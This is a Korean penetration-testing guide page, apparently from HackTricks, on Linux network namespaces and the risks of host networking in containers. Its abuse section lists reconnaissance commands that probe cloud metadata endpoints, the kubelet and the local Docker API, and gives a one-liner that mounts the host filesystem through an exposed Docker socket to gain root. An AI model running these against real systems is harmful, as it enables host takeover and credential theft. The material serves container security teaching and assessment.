# 네트워크 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

네트워크 네임스페이스는 인터페이스, IP 주소, 라우팅 테이블, ARP/neighbor 상태, 방화벽 규칙, 소켓, 그리고 `/proc/net` 같은 파일의 내용 등 네트워크 관련 자원을 격리합니다. 이 때문에 컨테이너는 호스트의 실제 네트워크 스택을 소유하지 않으면서도 자체 `eth0`, 로컬 라우트, 루프백 디바이스를 가진 것처럼 보일 수 있습니다.

보안 측면에서 네트워크 격리는 단순한 포트 바인딩 이상의 의미가 있습니다. 프라이빗 네트워크 네임스페이스는 워크로드가 직접 관찰하거나 재구성할 수 있는 범위를 제한합니다. 해당 네임스페이스가 호스트와 공유되면, 컨테이너는 애플리케이션에 노출되도록 의도되지 않았던 호스트 리스너, 호스트 로컬 서비스, 네트워크 제어 지점들을 갑자기 볼 수 있게 됩니다.

## 동작

새로 생성된 네트워크 네임스페이스는 인터페이스가 연결될 때까지 비어있거나 거의 비어 있는 네트워크 환경으로 시작합니다. 그런 다음 컨테이너 런타임은 가상 인터페이스를 생성하거나 연결하고, 주소를 할당하며, 라우트를 설정하여 워크로드가 기대하는 연결성을 제공하게 합니다. 브리지 기반 배포에서는 보통 컨테이너가 호스트 브리지에 연결된 veth 기반 인터페이스를 보게 됩니다. Kubernetes에서는 CNI 플러그인이 Pod 네트워킹에 대한 동등한 설정을 처리합니다.

이 아키텍처는 `--network=host` 또는 `hostNetwork: true`가 왜 큰 변화인지 설명합니다. 준비된 프라이빗 네트워크 스택을 받는 대신 워크로드는 호스트의 실제 네트워크 스택에 합류합니다.

## 실습

거의 비어 있는 네트워크 네임스페이스는 다음으로 확인할 수 있습니다:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
그리고 일반 컨테이너와 host-networked 컨테이너를 다음과 같이 비교할 수 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
호스트 네트워크를 사용하는 컨테이너는 더 이상 자체적으로 분리된 소켓과 인터페이스 뷰를 가지지 않습니다. 이 변화만으로도 프로세스가 어떤 권한을 가지고 있는지 묻기 이전에 이미 중요한 의미를 가집니다.

## 런타임 사용

Docker와 Podman은 일반적으로 설정이 달라지지 않는 한 컨테이너마다 별도의 네트워크 네임스페이스를 생성합니다. Kubernetes는 보통 각 Pod에 Pod 내부의 컨테이너들이 공유하지만 호스트와는 분리된 자체 네트워크 네임스페이스를 부여합니다. Incus/LXC 시스템도 네트워크 네임스페이스 기반의 풍부한 격리를 제공하며, 다양한 가상 네트워킹 구성을 지원하는 경우가 많습니다.

일반 원칙은 프라이빗 네트워킹이 기본적인 격리 경계이며, 호스트 네트워킹은 그 경계에서 명시적으로 벗어나는 옵트아웃 선택이라는 것입니다.

## 잘못된 구성

가장 중요한 잘못된 설정은 단순히 호스트 네트워크 네임스페이스를 공유하는 것입니다. 이는 성능, 저수준 모니터링 또는 편의성 때문에 이루어지는 경우가 있지만, 컨테이너에 제공되는 가장 명확한 경계 중 하나를 제거합니다. 호스트-로컬 리스너가 더 직접적으로 접근 가능해지고, localhost 전용 서비스가 접근 가능해질 수 있으며, `CAP_NET_ADMIN`이나 `CAP_NET_RAW`와 같은 권한은 이제 해당 작업이 호스트의 네트워크 환경에 적용되기 때문에 훨씬 더 위험해집니다.

또 다른 문제는 네트워크 네임스페이스가 분리되어 있어도 네트워크 관련 권한을 과도하게 부여하는 것입니다. 프라이빗 네임스페이스는 도움이 되지만, 그것이 raw 소켓이나 고급 네트워크 제어를 무해하게 만들지는 않습니다.

## 악용

격리가 약한 환경에서는 공격자가 호스트의 리스닝 서비스들을 조사하거나, loopback에만 바인딩된 관리 엔드포인트에 접근하거나, 정확한 권한과 환경에 따라 트래픽을 스니핑하거나 간섭할 수 있으며, `CAP_NET_ADMIN`이 있다면 라우팅이나 방화벽 상태를 재구성할 수도 있습니다. 클러스터 환경에서는 이로 인해 횡방향 이동(lateral movement)과 컨트롤플레인 정찰이 쉬워질 수 있습니다.

호스트 네트워킹이 의심된다면, 먼저 보이는 인터페이스와 리스너가 분리된 컨테이너 네트워크가 아니라 호스트에 속하는지 확인하는 것부터 시작하십시오:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
루프백 전용 서비스는 종종 처음으로 흥미로운 발견입니다:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
network capabilities가 있는 경우, workload가 표시되는 스택을 검사하거나 변경할 수 있는지 테스트하세요:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
클러스터나 클라우드 환경에서는 호스트 네트워킹이 메타데이터와 컨트롤-플레인 인접 서비스에 대한 빠른 로컬 recon을 정당화하기도 한다:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 전체 예시: Host Networking + Local Runtime / Kubelet Access

Host networking은 자동으로 host root를 제공하지는 않지만, 종종 노드 자체에서만 접근 가능하도록 의도된 서비스를 노출합니다. 이러한 서비스 중 하나가 약하게 보호되어 있다면, Host networking은 직접적인 privilege-escalation 경로가 됩니다.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost의 Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
영향:

- direct host compromise — 로컬 runtime API가 적절한 보호 없이 노출될 경우
- cluster reconnaissance or lateral movement — kubelet 또는 로컬 에이전트에 접근 가능할 경우
- traffic manipulation or denial of service — `CAP_NET_ADMIN`과 결합될 때

## 확인

이 점검의 목적은 프로세스가 자체 네트워크 스택을 가지고 있는지, 어떤 라우트와 리스너가 보이는지, 그리고 capabilities를 테스트하기도 전에 네트워크 뷰가 이미 호스트와 유사한지 여부를 파악하는 것입니다.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
여기서 흥미로운 점:

- 네임스페이스 식별자나 보이는 인터페이스 집합이 호스트와 유사해 보이면, 호스트 네트워킹이 이미 사용 중일 수 있습니다.
- `ss -lntup`는 루프백 전용 리스너와 로컬 관리 엔드포인트를 노출하기 때문에 특히 유용합니다.
- 경로, 인터페이스 이름, 방화벽 컨텍스트는 `CAP_NET_ADMIN` 또는 `CAP_NET_RAW`가 있는 경우 훨씬 더 중요해집니다.

컨테이너를 검토할 때는 항상 네트워크 네임스페이스를 권한 집합과 함께 평가하세요. 호스트 네트워킹에 강한 네트워크 권한이 결합된 경우는 브리지 네트워킹에 제한된 기본 권한 집합이 있는 경우와는 매우 다른 태세입니다.
{{#include ../../../../../banners/hacktricks-training.md}}
